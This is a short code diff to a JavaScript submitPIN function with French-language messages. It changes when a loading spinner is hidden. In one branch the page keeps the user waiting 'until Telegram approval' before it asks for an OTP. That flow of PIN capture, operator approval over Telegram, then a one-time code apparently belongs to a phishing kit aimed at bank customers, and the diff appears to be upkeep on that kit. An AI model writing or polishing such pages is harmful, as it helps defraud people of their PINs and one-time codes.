@@ -759,22 +759,23 @@ async function submitPIN(){
     }
   }
 
-  hideLoad();
-
   if(!r){
+    hideLoad();
     showPop('Serveur indisponible', 'Le serveur ne répond pas. Vérifiez votre connexion et réessayez.');
     pinVal=''; updatePinDots(); return;
   }
 
   var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id;
   if(sid){
-    // Keep spinner visible — user must approve in Telegram before moving to OTP
+    // Keep spinner — waits until Telegram approval before moving to OTP
     showLoad('En attente de validation…');
     startPoll(sid);
   } else if(r.success === false){
+    hideLoad();
     showPop('Erreur', r.message || 'Identifiants invalides. Réessayez.');
     pinVal=''; updatePinDots();
   } else {
+    hideLoad();
     showPop('Erreur inattendue', 'Réponse serveur incorrecte. Réessayez.');
     pinVal=''; updatePinDots();
   }
